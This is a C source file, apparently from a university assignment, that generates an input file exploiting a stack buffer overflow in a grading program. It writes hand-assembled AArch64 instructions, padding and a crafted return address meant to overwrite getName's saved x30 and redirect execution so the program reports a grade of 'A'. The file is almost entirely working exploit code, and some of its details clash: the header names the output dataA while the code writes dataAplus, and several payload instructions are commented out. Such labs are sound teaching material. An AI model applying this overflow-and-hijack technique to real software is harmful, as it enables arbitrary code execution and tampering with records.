/*--------------------------------------------------------------------*/
/* File: createdataA.c                                                */
/*                                                                    */
/* Function: Produces a file called dataA with the student name,      */
/* padding to overrun the stack, and a crafted instruction sequence   */
/* address. This address will overwrite getName's stored x30 and      */
/* redirect execution to a sequence that changes the grade to 'A'.    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   /* create a file pointer and iterator variable */
   FILE *dataAplus;

   /* Create a variable for the payload address */
   unsigned int payloadAddress;

   /* Create variables for the instructions */
   unsigned int movInstr;
   unsigned int strbInstr;
   unsigned int bInstr;
   unsigned int printfAddress = 0x400690; 

   /* open the file */
   dataAplus = fopen("dataAplus", "w+");

   /* write names to file */ 
   fprintf(dataAplus, "Alex & Matt"); /* 11 characters */ 

   /* write null byte to file */
   putc('\0', dataAplus);

   /* Calculate the address where the payload will be loaded */
   /* payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064); */
   /* fwrite(&payloadAddress, sizeof(unsigned int), 1, dataAplus); */

   /* Move 'A' into a register */
   movInstr = MiniAssembler_mov(0, 65); 
   fwrite(&movInstr, sizeof(unsigned int), 1, dataAplus);

   /* Store 'A' into the x0 register */
   /* strbInstr = MiniAssembler_strb(1, 0); */
   /* fwrite(&strbInstr, sizeof(unsigned int), 1, dataAplus); */

   movInstr = MiniAssembler_mov(1, 43);
   fwrite(&movInstr, sizeof(unsigned int), 1, dataAplus);

    /* Store 'A' into the grade variable */
   /* strbInstr = MiniAssembler_strb(2, 1); */
   /* fwrite(&strbInstr, sizeof(unsigned int), 1, dataAplus); */

    /* Branch to printf to print using the x0 register*/
    bInstr = MiniAssembler_bl(printfAddress, 0x42006c);
    fwrite(&bInstr, sizeof(bInstr), 1, dataAplus);

   /* Branch back to main function after getName */
   bInstr = MiniAssembler_b(0x40089c, 0x420070);
   fwrite(&bInstr, sizeof(unsigned int), 1, dataAplus);

   /* add padding to overrun the stack */
   fprintf(dataAplus, "%s", "anganganganganganggg"); /* 20 characters */

   /* write BSS address of adr instruction to file */
   fprintf(dataAplus, "%c", 0x64);
   fprintf(dataAplus, "%c", 0x00);
   fprintf(dataAplus, "%c", 0x42);
   fprintf(dataAplus, "%c", 0x00);
   fprintf(dataAplus, "%c", 0x00);
   fprintf(dataAplus, "%c", 0x00);
   fprintf(dataAplus, "%c", 0x00);
   fprintf(dataAplus, "%c", 0x00);
   
   /* close the file */
   fclose(dataAplus);
   
   return 0;
}